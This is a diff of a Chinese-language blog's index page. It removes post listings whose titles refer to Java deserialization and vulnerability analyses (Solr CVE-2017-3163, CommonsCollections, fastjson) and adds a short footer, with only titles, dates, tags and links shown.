-    <a href="/2021/04/11/solr%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90--CVE-2017-3163/">
-      <img class="lazyload" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://tva1.sinaimg.cn/large/008eGmZEly1gpewrft16cj31c00u0wx1.jpg">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2021-4-11 20:04</div>
-      <a href="/2021/04/11/solr%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90--CVE-2017-3163/" class="post-title">
-        <h3>solr漏洞分析--CVE-2017-3163</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-            <a href="/tags/Java/">Java<em>·</em></a>
-          
-            <a href="/tags/%E6%82%A6%E8%AF%BB/">悦读<em>·</em></a>
-          
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/Java/">Java</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p>Java</p>
-        <div class="post-bottom">
-          <a href="/2021/04/11/solr%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90--CVE-2017-3163/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb" itemscope="" itemtype="https://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/2021/04/05/CommonsCollections%203~7%E5%88%86%E6%9E%90/">
-      <img class="lazyload" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://tva1.sinaimg.cn/large/008eGmZEgy1gp924g7eqhj31o00u0dul.jpg">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2021-4-5 18:04</div>
-      <a href="/2021/04/05/CommonsCollections%203~7%E5%88%86%E6%9E%90/" class="post-title">
-        <h3>CommonsCollections 3～7分析</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-            <a href="/tags/Java/">Java<em>·</em></a>
-          
-            <a href="/tags/%E6%82%A6%E8%AF%BB/">悦读<em>·</em></a>
-          
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/Java/">Java</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p>Java</p>
-        <div class="post-bottom">
-          <a href="/2021/04/05/CommonsCollections%203~7%E5%88%86%E6%9E%90/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb post-list-thumb-left"  class="post post-list-thumb" itemscope="" itemtype="https://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/2021/04/01/CommonsCollections%202%E5%88%86%E6%9E%90/">
-      <img class="lazyload" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://tva1.sinaimg.cn/large/008eGmZEgy1gp4m1tiui1j31hc0u07wi.jpg">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2021-4-1 22:04</div>
-      <a href="/2021/04/01/CommonsCollections%202%E5%88%86%E6%9E%90/" class="post-title">
-        <h3>CommonsCollections 2分析</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-            <a href="/tags/Java/">Java<em>·</em></a>
-          
-            <a href="/tags/%E6%82%A6%E8%AF%BB/">悦读<em>·</em></a>
-          
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/Java/">Java</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p>Java</p>
-        <div class="post-bottom">
-          <a href="/2021/04/01/CommonsCollections%202%E5%88%86%E6%9E%90/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb" itemscope="" itemtype="https://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/2021/03/26/HW%E6%80%BB%E7%BB%93/">
-      <img class="lazyload" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://tva1.sinaimg.cn/large/008eGmZEly1goxaap4zwtj319n0u04c2.jpg">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2021-3-26 14:03</div>
-      <a href="/2021/03/26/HW%E6%80%BB%E7%BB%93/" class="post-title">
-        <h3>HW总结</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-            <a href="/tags/%E9%97%B2%E8%B0%88/">闲谈<em>·</em></a>
-          
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/%E9%97%B2%E8%B0%88/">闲谈</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p>闲谈</p>
-        <div class="post-bottom">
-          <a href="/2021/03/26/HW%E6%80%BB%E7%BB%93/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb post-list-thumb-left"  class="post post-list-thumb" itemscope="" itemtype="https://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/2021/03/11/%E5%86%8D%E6%8E%A2fastjson/">
-      <img class="lazyload" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://tva1.sinaimg.cn/large/008eGmZEly1gog88bsf23j31hc0u0x6p.jpg">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2021-3-11 20:03</div>
-      <a href="/2021/03/11/%E5%86%8D%E6%8E%A2fastjson/" class="post-title">
-        <h3>再探fastjson</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-            <a href="/tags/%E6%82%A6%E8%AF%BB/">悦读<em>·</em></a>
-          
-            <a href="/tags/java/">java<em>·</em></a>
-          
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/Java/">Java</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p>Java</p>
-        <div class="post-bottom">
-          <a href="/2021/03/11/%E5%86%8D%E6%8E%A2fastjson/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb" itemscope="" itemtype="https://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/2021/03/08/fastjson%201.22-1.24%20Templateslmpl%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/">
-      <img class="lazyload" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://tva1.sinaimg.cn/large/008eGmZEly1goct502mu3j31c00u04qs.jpg">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2021-3-8 21:03</div>
-      <a href="/2021/03/08/fastjson%201.22-1.24%20Templateslmpl%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/" class="post-title">
-        <h3>fastjson 1.22-1.24 Templateslmpl漏洞复现与分析</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-            <a href="/tags/%E6%82%A6%E8%AF%BB/">悦读<em>·</em></a>
-          
-            <a href="/tags/java/">java<em>·</em></a>
-          
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/Java/">Java</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p>Java</p>
-        <div class="post-bottom">
-          <a href="/2021/03/08/fastjson%201.22-1.24%20Templateslmpl%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-
-
-    </main>
-      <!-- 首页默认取最最新文章集 -->
-    <!-- 
-      <nav class="navigator">
-        
-        <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">&lt;i class&#x3D;&quot;iconfont icon-right&quot;&gt;&lt;&#x2F;i&gt;</a>
-      </nav>
-     -->
-  </div>
-  
-    <div id="pagination"><a href="/page/2/" class="">Previous</a></div>
-  
+        <hr>
+        <p><i class="iconfont icon-write"></i>一个好奇的人</p>
+      </section>
+    </main><!-- #main -->
+  </div><!-- #primary -->
 </div>
+
+
 
     </div>    
     <div class="ins-search">
